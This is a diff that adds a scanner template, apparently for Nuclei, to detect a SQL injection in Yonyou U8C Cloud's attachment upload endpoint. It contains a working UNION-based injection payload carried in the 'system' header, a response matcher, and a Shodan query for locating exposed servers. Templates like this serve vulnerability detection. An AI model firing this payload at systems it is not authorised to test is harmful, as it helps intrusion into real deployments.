@@ -1,0 +1,32 @@
+id: yonyou_u8c_cloud_upload_sql_injection
+
+info:
+  name: yonyou_u8c_cloud_upload_sql_injection
+  author: HK
+  severity: high
+  description: yonyou-u8c-cloud upload sql injection
+  metadata:
+    max-request: 1
+    shodan-query: body="http://uclient.yonyou.com/api/uclient/public/download/windows"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    POST /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    system: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
+    trantype: pk
+    isEncrypt: N
+    sign: token
+    Connection: close
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - qjxpq12321qxqxq
